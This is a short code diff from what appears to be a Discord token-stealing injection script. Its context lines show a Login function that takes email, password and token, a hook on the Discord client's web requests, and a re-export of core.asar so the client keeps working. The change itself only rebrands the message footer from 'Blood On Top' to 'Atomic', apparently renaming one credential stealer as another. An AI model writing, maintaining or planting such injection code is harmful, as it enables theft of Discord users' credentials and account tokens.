@@ -166,7 +166,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Blood On Top"
+                        "text": "Atomic"
                     }
                 }
             ]
@@ -359,4 +359,3 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
     }
 });
 module.exports = require('./core.asar')
-
